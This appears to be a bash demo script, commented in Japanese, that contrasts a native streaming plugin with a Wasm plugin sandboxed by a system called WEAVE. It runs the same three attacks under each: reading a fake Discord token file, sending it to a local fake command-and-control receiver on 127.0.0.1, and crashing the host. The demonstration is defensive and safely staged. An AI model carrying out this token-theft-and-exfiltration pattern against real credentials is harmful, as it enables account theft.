#!/usr/bin/env bash
# =============================================================================
# run_before_after_demo.sh — 「今までの世界」 vs 「WEAVE」を同じ攻撃で対比する
#
#   同じ 3 つの攻撃 (機密の読み取り / 外部への送信 / ホストのクラッシュ) を、
#     Before: 素の OS 権限で動くネイティブプラグイン (demo/bare/steal_plugin.c)
#     After : 同じ種類のコードを Wasm にした WEAVE プラグイン (malicious_plugin)
#   の両方で走らせ、片方は全部成功し配信ごと落ち、もう片方は全部弾かれて配信が無傷、を見せる。
#
#   安全: 読むのは一時ディレクトリの偽トークン、送る先は 127.0.0.1 の自作受信役だけ。
#   使い方: ./demo/run_before_after_demo.sh [--auto]   (--auto は各ステップの Enter 待ちを飛ばす)
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
AUTO=0; [ "${1:-}" = "--auto" ] && AUTO=1
BIN=./zig-out/bin
DIR=$(mktemp -d)
PORT_CNC=9099
PORT_DASH=3040
PORT_NODE=8040

c_head(){ printf "\n\033[1;7m %s \033[0m\n" "$*"; }
c_be(){ printf "\033[31;1m%s\033[0m\n" "$*"; }
c_af(){ printf "\033[32;1m%s\033[0m\n" "$*"; }
c_dim(){ printf "\033[2m%s\033[0m\n" "$*"; }
pause(){ [ "$AUTO" = 1 ] && { sleep "${1:-2}"; return; }; printf "\033[2m  [Enter で次へ]\033[0m"; read -r _; }

cleanup(){ for p in ${CNC:-} ${WEAVE:-}; do kill "$p" 2>/dev/null || true; done; sleep 0.3; for p in ${CNC:-} ${WEAVE:-}; do kill -9 "$p" 2>/dev/null || true; done; rm -rf "$DIR" /tmp/weave-demo 2>/dev/null || true; }
trap cleanup EXIT INT TERM

# --- 準備: 偽の機密と、ダミーの受信役 ---
mkdir -p /tmp/weave-demo
echo "FAKE-DISCORD-TOKEN-FOR-DEMO-ONLY-abc123" > /tmp/weave-demo/discord.token
python3 demo/bare/fake_cnc.py "$PORT_CNC" > "$DIR/cnc.log" 2>&1 &
CNC=$!
sleep 0.4

clear 2>/dev/null || true
c_head "配信プラグインが 1 個、悪意を持っていたら？"
c_dim "同じ 3 つの攻撃を、素の環境と WEAVE の両方で走らせて比べます。"
c_dim "偽の機密: /tmp/weave-demo/discord.token   受信役: 127.0.0.1:$PORT_CNC (ネットワークには出ません)"
pause

# ============================================================================
c_head "① 今までの世界 — プラグインはあなたと同じ権限で動く"
# ============================================================================
cc -O2 demo/bare/steal_plugin.c -o "$DIR/steal" 2>/dev/null
c_dim "$ cc steal_plugin.c -o steal && ./steal   (OBS プラグイン相当をネイティブで実行)"
echo
"$DIR/steal" /tmp/weave-demo/discord.token 127.0.0.1 "$PORT_CNC" || true
echo
c_dim "受信役 (C&C) 側のログ:"
sed 's/^/    /' "$DIR/cnc.log"
echo
c_be "結果: トークンは読まれ、外部へ送られ、配信ソフトはクラッシュした。"
c_be "      プラグイン 1 個を入れただけで、アカウントも配信も持っていかれる。"
pause 3

# ============================================================================
c_head "② WEAVE — 同じ種類のコードを、宣言した権限の中だけで動かす"
# ============================================================================
c_dim "起動前に「このプラグインが乗っ取られても、どこまで届くか」を計算しておく:"
echo
"$BIN/weave-audit" malicious_plugin 2>/dev/null | sed 's/^/  /'
pause 3

CNC_BEFORE=$(wc -l < "$DIR/cnc.log")
c_dim "WEAVE を起動し、同じ攻撃コード (malicious_plugin) を載せる…"
"$BIN/WEAVE" --no-twitch --mock-obs --mock-obs-file "$DIR/obs.jsonl" \
  --dash-port "$PORT_DASH" --node-port "$PORT_NODE" \
  --audit-log "$DIR/audit.log" --state-dir "$DIR/state" --dashboard-token demo \
  wasm-apps/kusa_node.wasm wasm-apps/malicious_plugin.wasm > "$DIR/weave.log" 2>&1 &
WEAVE=$!
for _ in $(seq 1 80); do grep -q "Running" "$DIR/weave.log" 2>/dev/null && break; sleep 0.05; done
c_af "  → Inspector: http://127.0.0.1:$PORT_DASH/?token=demo"
sleep 1

# 攻撃を発火させる (malicious_plugin は tick / chat で on_message に入り 3 攻撃を試みる)
"$BIN/weave" topic pub ext.twitch.chat.message '{"user":"x","message":"go"}' --url "ws://127.0.0.1:$PORT_DASH/ws" --token demo >/dev/null 2>&1 || true
sleep 1

echo
c_dim "プラグインのログ (同じ 3 攻撃を試みた結果):"
grep -E "\[malicious\]" "$DIR/weave.log" | grep -E "Attack|BLOCKED" | sed 's/^.*\[malicious\]/  /' | head -8
echo
c_dim "監査ログ (WEAVE が弾いた記録):"
grep -o '"attack":"[^"]*","result":"[^"]*"' "$DIR/weave.log" 2>/dev/null | sed 's/^/  /' | head
grep -c "acl_denied" "$DIR/audit.log" >/dev/null 2>&1 && c_dim "  core.security.acl_denied: $(grep -c acl_denied "$DIR/audit.log") 件 (権限外の操作)"
echo
c_dim "受信役 (C&C) 側のログ — WEAVE 実行中に新たな受信があったか:"
if [ "$(wc -l < "$DIR/cnc.log")" -le "$CNC_BEFORE" ]; then c_af "    (新たな受信なし。外部へは 1 バイトも出ていない)"; else sed 's/^/    /' "$DIR/cnc.log"; fi
echo
c_dim "配信は? kusa_node は同じ WEAVE 上で普通に動き続けている:"
kill -0 "$WEAVE" 2>/dev/null && c_af "    WEAVE プロセス: 生存 (配信は 1 度も止まっていない)"
echo
c_af "結果: ファイル読み取りは物理的に不可能 (fopen が無い)、"
c_af "      外部送信も不可能 (socket が無い)、権限外の操作は ACL が拒否。"
c_af "      そして起動前の予測どおり — 実世界のシンクには 1 つも到達していない。"

c_head "まとめ"
row(){ printf "  %-20s  \033[31;1m%-16s\033[0m  \033[32;1m%s\033[0m\n" "$1" "$2" "$3"; }
  printf "  \033[1m%-20s  %-16s  %s\033[0m\n" "" "今までの世界" "WEAVE"
  row "保存されたトークン" "読まれた"   "読めない (FS が無い)"
  row "外部への送信"       "送られた"   "出られない (socket が無い)"
  row "配信ソフト"         "クラッシュ" "無傷 (別セルで隔離)"
  printf "  %-20s  \033[2m%-16s\033[0m  \033[2m%s\033[0m\n" "必要な設定" "なし" "manifest に許可を書くだけ"
echo
c_dim "logs: $DIR"
[ "$AUTO" = 1 ] && sleep 2
